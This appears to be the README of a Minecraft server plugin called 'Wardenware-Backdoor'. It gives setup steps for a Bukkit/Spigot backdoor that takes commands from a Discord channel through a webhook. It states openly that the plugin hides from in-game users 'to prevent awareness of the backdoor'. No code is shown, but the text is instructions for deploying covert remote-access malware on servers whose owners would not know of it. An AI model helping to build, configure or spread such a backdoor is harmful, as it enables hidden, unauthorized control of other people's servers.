# Wardenware-Backdoor
haha bukkit, spigot and discord api go brrrrr
# CONFIG
So this may be confusing but go to your discord channel and create a webhook, copy that webhook URL and and put it in " "YOUR DISCORD WEBHOOK URL HERE" ".
Then the command is /wardenware and execute that in the DISCORD CHANNEL. It refuses to send a command on minecraft to prevent awareness of the backdoor.

Also don't come crying to me and shit when the plugin doesn't work, because I won't be updating this for long.
